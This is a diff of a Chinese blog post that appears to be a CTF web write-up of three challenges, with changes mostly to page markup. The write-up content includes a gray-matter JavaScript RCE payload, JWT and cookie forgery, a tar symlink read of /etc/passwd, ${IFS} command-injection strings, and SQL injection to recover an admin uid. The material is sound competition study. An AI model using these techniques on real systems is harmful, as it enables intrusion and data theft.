@@ -60,13 +60,13 @@
       </header>
       <div class="post-layout section-shell">
         <article class="article-content" data-article-content><p>两天三道web也算是有惊无险</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608193109087.png" alt="image-20250608193109087" loading="lazy" decoding="async"></figure></p>
-<h1 id="filesystem">Filesystem<a class="heading-anchor" href="#filesystem" aria-label="链接到 Filesystem">#</a></h1><blockquote>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1433 / 329;--image-max-width:3310px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608193109087.png" alt="image-20250608193109087" loading="lazy" decoding="async" width="1433" height="329"></span></figure></p>
+<h2 id="filesystem">Filesystem<a class="heading-anchor" href="#filesystem" aria-label="链接到 Filesystem">#</a></h2><blockquote>
 <p>这是一个开发了不到百分之十的文件管理系统
 tips：赛题服务环境启动较慢，请耐心等待2分钟左右再访问赛题，若长时间没有服务请尝试重启</p>
 </blockquote>
 <p>审计代码最开始发现的就是<code>admin.controller.ts</code>中使用了<code>gray-matter</code>库来处理用户的<code>slogon</code></p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607191040253.png" alt="image-20250607191040253" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1258 / 503;--image-max-width:1901px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607191040253.png" alt="image-20250607191040253" loading="lazy" decoding="async" width="1258" height="503"></span></figure></p>
 <p>经过测试可以直接RCE</p>
 <figure class="code-block"><figcaption><span>js</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-js"><span class="hljs-comment">// import * as gray from &quot;gray-matter&quot;</span>
 <span class="hljs-keyword">const</span> gray = <span class="hljs-built_in">require</span>(<span class="hljs-string">&#x27;gray-matter&#x27;</span>);
@@ -76,16 +76,16 @@ tips：赛题服务环境启动较慢，请耐心等待2分钟左右再访问赛
 
 <span class="hljs-keyword">const</span> profile = gray.<span class="hljs-title function_">stringify</span>(<span class="hljs-title function_">gray</span>(payload).<span class="hljs-property">content</span>, {<span class="hljs-attr">username</span>: username});
 
-<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(profile)</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607191722074.png" alt="image-20250607191722074" loading="lazy" decoding="async"></figure></p>
+<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(profile)</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1548 / 1154;--image-max-width:1019px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607191722074.png" alt="image-20250607191722074" loading="lazy" decoding="async" width="1548" height="1154"></span></figure></p>
 <p>那么我就可以往slogon里写入恶意代码从而达到任意命令执行</p>
 <p>但是到这里我们需要先伪造jwt，而secret的值让我很难相信他是真的secret，发现有几处从<code>configFile = &quot;/opt/filesystem/adminconfig.lock&quot;</code>读取内容，猜测真的secret在其中</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607192104589.png" alt="image-20250607192104589" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1239 / 407;--image-max-width:2314px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607192104589.png" alt="image-20250607192104589" loading="lazy" decoding="async" width="1239" height="407"></span></figure></p>
 <p>于是继续往下走</p>
 <p>在<code>app.controller.ts</code>中看到</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607192155251.png" alt="image-20250607192155251" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1179 / 426;--image-max-width:2103px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607192155251.png" alt="image-20250607192155251" loading="lazy" decoding="async" width="1179" height="426"></span></figure></p>
 <p>想到软连接(ln -s后tar打包，zip不知道为什么不行)</p>
 <p>成功读出/etc/passwd</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607192543761.png" alt="image-20250607192543761" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:833 / 500;--image-max-width:1266px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607192543761.png" alt="image-20250607192543761" loading="lazy" decoding="async" width="833" height="500"></span></figure></p>
 <p>但是尝试读环境变量和/opt/filesystem/adminconfig.lock均未果，源码位置猜谜猜了半天也没找到</p>
 <p>想着试试tar解压目录穿越覆盖adminconfig.lock直接改掉secret</p>
 <p>无奈中尝试直接用sec_y0u_nnnnever_know伪造jwt，没想到居然成功了，前面一大半路子白绕</p>
@@ -119,18 +119,18 @@ malicious_slogon = <span class="hljs-string">&quot;&quot;&quot;---js
     <span class="hljs-keyword">return</span> token
 
 
-token = forge_jwt_token(slogon=malicious_slogon)</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607192739563.png" alt="image-20250607192739563" loading="lazy" decoding="async"></figure></p>
+token = forge_jwt_token(slogon=malicious_slogon)</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1334 / 787;--image-max-width:1288px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607192739563.png" alt="image-20250607192739563" loading="lazy" decoding="async" width="1334" height="787"></span></figure></p>
 <p>暴搜flag无奈服务器太卡了，最后在ass.sh得知/data/flag目录后找到flag</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607190201331.png" alt="image-20250607190201331" loading="lazy" decoding="async"></figure></p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607190217208.png" alt="image-20250607190217208" loading="lazy" decoding="async"></figure></p>
-<h1 id="layers-of-compromise">Layers of Compromise<a class="heading-anchor" href="#layers-of-compromise" aria-label="链接到 Layers of Compromise">#</a></h1><p>神人没想user爆破</p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:604 / 277;--image-max-width:1657px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607190201331.png" alt="image-20250607190201331" loading="lazy" decoding="async" width="604" height="277"></span></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1245 / 395;--image-max-width:2395px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607190217208.png" alt="image-20250607190217208" loading="lazy" decoding="async" width="1245" height="395"></span></figure></p>
+<h2 id="layers-of-compromise">Layers of Compromise<a class="heading-anchor" href="#layers-of-compromise" aria-label="链接到 Layers of Compromise">#</a></h2><p>神人没想user爆破</p>
 <p>user/password123进入后伪造cookie</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607202918381.png" alt="image-20250607202918381" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:500 / 520;--image-max-width:731px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250607202918381.png" alt="image-20250607202918381" loading="lazy" decoding="async" width="500" height="520"></span></figure></p>
 <p>发现二级目录，且点击日志后会重定向到登陆界面，猜测需要获取一个token去访问</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608135926496.png" alt="image-20250608135926496" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2560 / 1458;--image-max-width:1334px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608135926496.png" alt="image-20250608135926496" loading="lazy" decoding="async" width="2560" height="1458"></span></figure></p>
 <p>爆破文件得到<code>/secrettttts/token.txt</code></p>
 <p>username和auth_key都给了，算md5后序列化数据并base64编码</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608135642200.png" alt="image-20250608135642200" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:672 / 461;--image-max-width:1108px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608135642200.png" alt="image-20250608135642200" loading="lazy" decoding="async" width="672" height="461"></span></figure></p>
 <p>写出auth_token生成脚本</p>
 <figure class="code-block"><figcaption><span>php</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-php"><span class="hljs-meta">&lt;?php</span>
 <span class="hljs-variable">$data</span> = [
@@ -138,14 +138,14 @@ token = forge_jwt_token(slogon=malicious_slogon)</code></pre></figure><p><figure
     <span class="hljs-string">&#x27;hash&#x27;</span> =&gt; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-string">&#x27;dev&#x27;</span> . <span class="hljs-string">&#x27;S3cr3tK3y!2023&#x27;</span>)
 ];
 <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$data</span>));</code></pre></figure><p>发现能访问日志了</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608135821038.png" alt="image-20250608135821038" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2552 / 1452;--image-max-width:1336px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608135821038.png" alt="image-20250608135821038" loading="lazy" decoding="async" width="2552" height="1452"></span></figure></p>
 <p>闭合后执行命令</p>
-<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">&quot;;${IFS}ls${IFS}/;#</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608140654252.png" alt="image-20250608140654252" loading="lazy" decoding="async"></figure></p>
+<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">&quot;;${IFS}ls${IFS}/;#</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2552 / 1452;--image-max-width:1336px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608140654252.png" alt="image-20250608140654252" loading="lazy" decoding="async" width="2552" height="1452"></span></figure></p>
 <p>然后又是漫长的找flag时间</p>
-<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">&quot;;${IFS}nl${IFS}../../f*/f*;#</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608140948765.png" alt="image-20250608140948765" loading="lazy" decoding="async"></figure></p>
-<h1 id="ezapp-and-server">ezAPP_And_SERVER<a class="heading-anchor" href="#ezapp-and-server" aria-label="链接到 ezAPP And SERVER">#</a></h1><p>附件拿到一个hap</p>
+<figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">&quot;;${IFS}nl${IFS}../../f*/f*;#</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2552 / 1452;--image-max-width:1336px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608140948765.png" alt="image-20250608140948765" loading="lazy" decoding="async" width="2552" height="1452"></span></figure></p>
+<h2 id="ezapp-and-server">ezAPP_And_SERVER<a class="heading-anchor" href="#ezapp-and-server" aria-label="链接到 ezAPP And SERVER">#</a></h2><p>附件拿到一个hap</p>
 <p>查看abc发现xor的key和加密的一些字符</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608194738522.png" alt="image-20250608194738522" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1927 / 1160;--image-max-width:1263px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608194738522.png" alt="image-20250608194738522" loading="lazy" decoding="async" width="1927" height="1160"></span></figure></p>
 <p>解密</p>
 <figure class="code-block"><figcaption><span>python</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_string</span>(<span class="hljs-params">a</span>):
     a = a.encode()
@@ -163,7 +163,7 @@ token = forge_jwt_token(slogon=malicious_slogon)</code></pre></figure><p><figure
 <span class="hljs-built_in">print</span>(decrypt_string(<span class="hljs-string">&quot;|z}w{Xp|qVXE]Y[v\u000bD\u0001qudwtps|rre\rs\u007fx{qrT\u007fvscts\u0005ykF\u0004~a~J\u0001@\n\u0003YaD\u0001B\u0004K9\\DFUH\u001dyFDc[Fw\u0006\u0001guxsxaJ\u0007h\u0006]aGqGd[p[Dtd|\u0002\u0007\u0001dXYG}RPsAB~\u0005K@F|ZFYtW|\u007f?A\u0006~aG\u0006cN}dKV^XVDl\u0002j\u0002\u0005Cukxzzkkua\u0005d^\u001fRhP\u0004jkFZe\ruQwCUtYV~P~[DVVfc@@8y\u0006@G\u0000{Ea{{}ZeX\\xhCrYU~gaM~t\u0000\u0019^Fup\u007fdF\u0004q`q\u001bS@tAA\u001cd\u0006\u001fzAB[\u007ftpeSz`P_8\n\bfAL\u000bykAt`Dl\u0007W\u0019\u007fDExr@y|Sf\u0003_HPd\u0005jf`[k_[Y\u001eY\u0003\u001aU\u000b|tg\u0005\u0003fAgiEDAw@vdsD;x\u001b\\|PrubUxe\u0002\u0005x\u001eVv~\u0000mrkzzww\u0003d\u007fXsBuur\u0001_zb]G\u0006\u0004\u000bu\u0003PvzJ~EfdDs|cE\u001eqp\u0000@&gt;aE{usbpq&quot;</span>))
 <span class="hljs-built_in">print</span>(decrypt_string(<span class="hljs-string">&quot;\u001eRD\\\u001dD\u0000\u001dTTGRYSU&quot;</span>))
 <span class="hljs-built_in">print</span>(decrypt_string(<span class="hljs-string">&quot;FpBz\u0001ecH\n\u001bEzx\u0017@|SrAXQGkloXz\u0007ElXZ&quot;</span>))
-<span class="hljs-built_in">print</span>(decrypt_string(<span class="hljs-string">&quot;W_UR&quot;</span>))</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608195509301.png" alt="image-20250608195509301" loading="lazy" decoding="async"></figure></p>
+<span class="hljs-built_in">print</span>(decrypt_string(<span class="hljs-string">&quot;W_UR&quot;</span>))</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2560 / 1560;--image-max-width:1247px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608195509301.png" alt="image-20250608195509301" loading="lazy" decoding="async" width="2560" height="1560"></span></figure></p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">RSA2048|PKCS1
 /api/v1/getflag
 /api/v1/contacts?uid=
@@ -182,11 +182,11 @@ r24[3] = createobjectwithbuffer([&quot;uid&quot;, &quot;f633ec24-cfe6-42ba-bcd8-
 r24[4] = createobjectwithbuffer([&quot;uid&quot;, &quot;eb8991c8-9b6f-4bc8-89dd-af3576e92bdb&quot;]);
 r24[5] = createobjectwithbuffer([&quot;uid&quot;, &quot;db62356d-3b99-4764-b378-e46cb95df9e6&quot;]);
 r24[6] = createobjectwithbuffer([&quot;uid&quot;, &quot;8f4610ee-ee87-4cca-ad92-6cac4fdbe722&quot;]);
-r24[7] = createobjectwithbuffer([&quot;uid&quot;, &quot;1678d80e-fd4d-4de3-aae2-cb0077f10c21&quot;]);</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608195735761.png" alt="image-20250608195735761" loading="lazy" decoding="async"></figure></p>
+r24[7] = createobjectwithbuffer([&quot;uid&quot;, &quot;1678d80e-fd4d-4de3-aae2-cb0077f10c21&quot;]);</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2560 / 1560;--image-max-width:1247px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608195735761.png" alt="image-20250608195735761" loading="lazy" decoding="async" width="2560" height="1560"></span></figure></p>
 <p>再utils中看到jwt的生成逻辑</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608204139291.png" alt="image-20250608204139291" loading="lazy" decoding="async"></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:1171 / 770;--image-max-width:1156px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608204139291.png" alt="image-20250608204139291" loading="lazy" decoding="async" width="1171" height="770"></span></figure></p>
 <p>伪造jwt后sql注入出admin的uid</p>
-<p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/8b36f9b550999546cd2ea431765dce7.png" alt="8b36f9b550999546cd2ea431765dce7" loading="lazy" decoding="async"><figcaption>8b36f9b550999546cd2ea431765dce7</figcaption></figure></p>
+<p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2560 / 592;--image-max-width:3286px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/8b36f9b550999546cd2ea431765dce7.png" alt="8b36f9b550999546cd2ea431765dce7" loading="lazy" decoding="async" width="2560" height="592"></span><figcaption>8b36f9b550999546cd2ea431765dce7</figcaption></figure></p>
 <figure class="code-block"><figcaption><span>text</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-text">{&quot;data&quot;:{&quot;users&quot;:[{&quot;uuid&quot;:&quot;9d5ec98c-5848-4450-9e58-9f97b6b3b7bc&quot;,&quot;name&quot;:&quot;admin&quot;,&quot;phone&quot;:&quot;123-456-7890&quot;},{&quot;uuid&quot;:&quot;f47ac10b-58cc-4372-a567-0e02b2c3d479&quot;,&quot;name&quot;:&quot;Bob&quot;,&quot;phone&quot;:&quot;987-654-3210&quot;},{&quot;uuid&quot;:&quot;c9c1e5b2-5f5b-4c5b-8f5b-5f5b5f5b5f5b&quot;,&quot;name&quot;:&quot;Charlie&quot;,&quot;phone&quot;:&quot;555-555-5555&quot;},{&quot;uuid&quot;:&quot;732390b8-ccb6-41de-a93b-94ea059fd263&quot;,&quot;name&quot;:&quot;David&quot;,&quot;phone&quot;:&quot;444-444-4444&quot;},{&quot;uuid&quot;:&quot;f633ec24-cfe6-42ba-bcd8-ad2dfae6d547&quot;,&quot;name&quot;:&quot;Eve&quot;,&quot;phone&quot;:&quot;333-333-3333&quot;},{&quot;uuid&quot;:&quot;eb8991c8-9b6f-4bc8-89dd-af3576e92bdb&quot;,&quot;name&quot;:&quot;Frank&quot;,&quot;phone&quot;:&quot;222-222-2222&quot;},{&quot;uuid&quot;:&quot;db62356d-3b99-4764-b378-e46cb95df9e6&quot;,&quot;name&quot;:&quot;Grace&quot;,&quot;phone&quot;:&quot;111-111-1111&quot;},{&quot;uuid&quot;:&quot;8f4610ee-ee87-4cca-ad92-6cac4fdbe722&quot;,&quot;name&quot;:&quot;Hannah&quot;,&quot;phone&quot;:&quot;000-000-0000&quot;},{&quot;uuid&quot;:&quot;1678d80e-fd4d-4de3-aae2-cb0077f10c21&quot;,&quot;name&quot;:&quot;Ian&quot;,&quot;phone&quot;:&quot;123-123-1234&quot;},{&quot;uuid&quot;:&quot;5845b71f-ebb6-4707-8199-a4e46acf351f&quot;,&quot;name&quot;:&quot;Jack&quot;,&quot;phone&quot;:&quot;456-456-4567&quot;}]}}</code></pre></figure><p>拿到admin的uid，于是客户端逻辑构造jwt和sign</p>
 <figure class="code-block"><figcaption><span>python</span><button class="icon-text-button" type="button" data-copy-code aria-label="复制代码"><svg class="icon" width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"></rect><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"></path></svg><span>复制</span></button></figcaption><pre><code class="hljs language-python"><span class="hljs-keyword">import</span> requests
 <span class="hljs-keyword">import</span> jwt
@@ -255,12 +255,12 @@ TwIDAQAB
 
 
 <span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:
-    get_flag()</code></pre></figure><p><figure class="article-image"><img src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608200305707.png" alt="image-20250608200305707" loading="lazy" decoding="async"></figure></p>
+    get_flag()</code></pre></figure><p><figure class="article-image" data-image-layout="intrinsic"><span class="article-image-frame" style="--image-ratio:2560 / 1560;--image-max-width:1247px"><img data-article-image src="https://github.com/xyaxxya/PicGo/raw/main/img/image-20250608200305707.png" alt="image-20250608200305707" loading="lazy" decoding="async" width="2560" height="1560"></span></figure></p>
 <blockquote>
 <p>Flag: {&quot;flag&quot;:&quot;flag{lDBRUyyVQNGHtZn7SIuu295KAS3kniFk}&quot;}</p>
 </blockquote>
 </article>
-        <aside class="toc-column"><nav class="post-toc" aria-label="文章目录" ><span>目录</span><div data-toc-list><p>本文没有分节</p></div></nav></aside>
+        <aside class="toc-column"><nav class="post-toc" aria-label="文章目录" ><span>目录</span><div data-toc-list><a class="toc-depth-2" href="#filesystem">Filesystem</a><a class="toc-depth-2" href="#layers-of-compromise">Layers of Compromise</a><a class="toc-depth-2" href="#ezapp-and-server">ezAPP And SERVER</a></div></nav></aside>
       </div>
       <div class="post-tools section-shell">
         <button type="button" data-copy-link><svg class="icon" width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M9 17H7A5 5 0 0 1 7 7h2"></path><path d="M15 7h2a5 5 0 1 1 0 10h-2"></path><line x1="8" x2="16" y1="12" y2="12"></line></svg><span>复制链接</span></button>
@@ -275,7 +275,7 @@ TwIDAQAB
     <a href="/posts/b63ba91a.html"><span>2025/06/18</span><strong>2025PYCC</strong><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a>
     <a href="/posts/a646b97b.html"><span>2025/04/15</span><strong>TGCTF_web</strong><svg class="icon" width="19" height="19" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M7 7h10v10"></path><path d="M7 17 17 7"></path></svg></a></div></section>
     </main>
-    
+    <button class="floating-toc-button" type="button" data-toc-toggle aria-label="打开目录" data-tooltip="目录"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M8 5h13"></path><path d="M13 12h8"></path><path d="M13 19h8"></path><path d="M3 10a2 2 0 0 0 2 2h3"></path><path d="M3 5v12a2 2 0 0 0 2 2h3"></path></svg></button>
     
     <footer class="site-footer">
       <div class="footer-lead">
@@ -295,26 +295,26 @@ TwIDAQAB
       </div>
     </footer>
     
-    <div class="mobile-menu" data-mobile-menu aria-hidden="true">
+    <dialog class="mobile-menu" data-mobile-menu aria-label="站点导航">
       <button class="mobile-menu-close" type="button" data-menu-close aria-label="关闭菜单"><svg class="icon" width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M18 6 6 18"></path><path d="m6 6 12 12"></path></svg></button>
       <nav aria-label="移动导航"><a class="mobile-menu-link" href="/#articles">文章</a><a class="mobile-menu-link" href="/categories/">专题</a><a class="mobile-menu-link" href="/tags/">标签</a><a class="mobile-menu-link" href="/archives/">归档</a><a class="mobile-menu-link" href="/about/">关于</a></nav>
       <div class="mobile-menu-social">
     <a href="https://github.com/xyaxxya" aria-label="GitHub" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><circle cx="12" cy="18" r="3"></circle><circle cx="6" cy="6" r="3"></circle><circle cx="18" cy="6" r="3"></circle><path d="M18 9v2c0 .6-.4 1-1 1H7c-.6 0-1-.4-1-1V9"></path><path d="M12 12v3"></path></svg></a>
     <a href="https://blog.csdn.net/xydsg" aria-label="CSDN" target="_blank" rel="noopener noreferrer"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true" focusable="false"><path d="M13.4 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2v-7.4"></path><path d="M2 6h4"></path><path d="M2 10h4"></path><path d="M2 14h4"></path><path d="M2 18h4"></path><path d="M21.378 5.626a1 1 0 1 0-3.004-3.004l-5.01 5.012a2 2 0 0 0-.506.854l-.837 2.87a.5.5 0 0 0 .62.62l2.87-.837a2 2 0 0 0 .854-.506z"></path></svg></a>
